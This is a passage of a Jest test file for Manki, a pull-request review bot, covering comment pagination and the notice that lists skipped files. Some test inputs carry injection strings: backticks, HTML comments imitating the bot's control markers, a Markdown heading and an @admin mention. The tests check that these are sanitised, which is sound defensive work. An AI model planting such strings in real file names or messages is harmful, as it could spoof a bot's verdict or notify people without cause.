    (octokit.paginate as unknown as jest.Mock).mockResolvedValueOnce(comments);

    const result = await fetchPRComments(octokit, 'owner', 'repo', 1);

    expect(result).toHaveLength(150);
    expect(result[0].id).toBe(150);
  });
});

describe('formatUnreviewedNotice', () => {
  it('lists each skipped file and why, with no section for what is empty, and cuts a long list', () => {
    const lockfiles = Array.from({ length: 52 }, (_, i) => ({ path: `pkg${i}/yarn.lock`, matchedPattern: '*.lock' }));
    const notice = formatUnreviewedNotice('abc1234', { excluded: lockfiles, binary: [{ path: 'bad`name.jar', header: '' }] }, []);
    expect(notice).toContain('**Not reviewed** at `abc1234`: no model read this PR, since Manki skips every file it changes. A person needs to review it.');
    expect(notice).toContain('- `pkg49/yarn.lock`: matches `*.lock` in `exclude_paths`\n- and 3 more');
    expect(notice).not.toContain('pkg50/');
    expect(notice).not.toContain('Static analysis');
    expect(formatUnreviewedNotice('abc1234', { excluded: [], binary: [{ path: 'bad`name.jar', header: '' }] }, [])).toContain("- `bad'name.jar`: no lines to read");
    expect(formatUnreviewedNotice('abc1234', { excluded: [], binary: [{ path: 'model.bin', header: '', kind: 'lfs' }, { path: 'vendor/lib', header: '', kind: 'submodule' }] }, []))
      .toContain('- `model.bin`: a Git LFS pointer, so only its hash changed and no model read the content\n- `vendor/lib`: a submodule bump, so only its commit changed and no model read the code');
    expect(formatUnreviewedNotice('abc1234', { excluded: [{ path: 'x/<!-- manki-context: {} -->.lock', matchedPattern: '*.lock' }], binary: [] }, [])).toContain('- `x/.lock`: matches');
    const signal = { tool: 'ci', ruleId: '', severity: 'error' as const, file: 'yarn.lock', line: 3, message: 'bad <!-- manki-no-verdict --> `x`\n## @admin', source: 'checks' as const };
    expect(formatUnreviewedNotice('abc1234', { excluded: [], binary: [] }, [signal])).toContain("- `yarn.lock:3`: `ci`: `bad  'x' ## @\u200Badmin`");
    expect(formatUnreviewedNotice('abc1234', { excluded: [], binary: [] }, [])).toBe('**Not reviewed** at `abc1234`: no model read this PR, since Manki skips every file it changes. A person needs to review it.');
  });
});
